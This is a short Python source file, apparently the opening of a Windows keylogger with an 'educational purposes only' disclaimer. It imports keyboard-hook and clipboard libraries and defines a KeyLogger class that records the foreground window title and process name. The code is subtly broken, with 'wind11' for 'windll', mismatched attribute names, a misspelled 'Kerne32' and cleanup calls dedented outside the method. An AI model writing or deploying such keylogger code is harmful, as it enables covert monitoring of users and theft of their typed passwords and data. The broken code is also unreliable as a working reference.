# Author: Onyonka Maeri
# Date: 2024-06-01
# WARNING:
# This script is intended for educational purposes only.
# Unauthorized use of this script on systems you do not own or
# have explicit permission to test is illegal and unethical.
# Use responsibly and within the bounds of all applicable laws.


from ctypes import byref, create_string_buffer, c_ulong, wind11
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10

class KeyLogger:
    def __init__(self):
        self.currrent_window = None

    def get_current_process(self):
        hwnd = wind11.user32.GetForegroundWindow()
        pid = c_ulong(0)
        wind11.user32.GetWindowThreadProcessId(hwnd,byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = wind11.Kernel32.OpenProcess(0x400 | 0x10,False, pid)
        wind11.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        wind11.user32.GetWindowTextA(hwnd,byref(window_title),512)
        try:
            self.currrent_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name Unknown')
            print('\n', process_id, executable.value.decode(), self.current_window)
wind11.Kernel32.CloseHandle(hwnd)
wind11.Kerne32.CloseHandle(h_process)